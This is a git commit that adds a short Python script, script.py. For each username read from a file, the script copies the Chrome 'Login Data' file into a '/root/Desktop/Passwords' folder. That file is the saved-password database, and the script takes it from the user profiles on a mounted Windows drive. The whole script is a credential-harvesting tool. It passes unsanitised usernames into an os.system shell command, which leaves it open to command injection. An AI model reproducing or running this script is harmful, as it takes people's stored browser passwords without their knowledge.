bf11d1a76e0b9127d701832718d820f12fa1cef3
Adam Hassan <34610663+Adamkadaban@users.noreply.github.com>
2019-11-12 16:14:09 -0500

    Create script.py

---
+++ script.py
@@ -0,0 +1,17 @@
+prefix=""
+import os
+#os.system('ls >> users')
+fin=open('users')
+data=fin.readlines()
+usernames=[]
+for i in data:
+    if str(i)[:2]==prefix:
+        usernames.append(i.strip())
+fin.close()
+
+#print(usernames)
+for i in usernames:
+    try:
+        os.system("cp '/media/root/Windows/Users/"+i+"/AppData/Local/Google/Chrome/User Data/Default/Login Data' '/root/Desktop/Passwords/"+i+"'")
+    except:
+        pass
